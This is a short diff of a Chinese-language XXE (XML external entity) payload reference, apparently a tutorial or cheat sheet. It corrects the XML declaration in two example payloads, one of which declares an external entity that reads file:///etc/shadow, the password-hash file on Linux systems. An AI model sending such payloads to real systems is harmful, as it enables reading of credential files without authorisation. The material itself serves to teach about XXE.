@@ -7,7 +7,7 @@
 基础Payload：
 
 ```
-<!--?xml version="1.0" ?-->
+<?xml version="1.0" ?>
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
  <userInfo>
   <firstName>John</firstName>
@@ -16,7 +16,7 @@
 ```
 
 ```
-<!--?xml version="1.0" ?-->
+<?xml version="1.0" ?>
 <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
 <userInfo>
  <firstName>John</firstName>
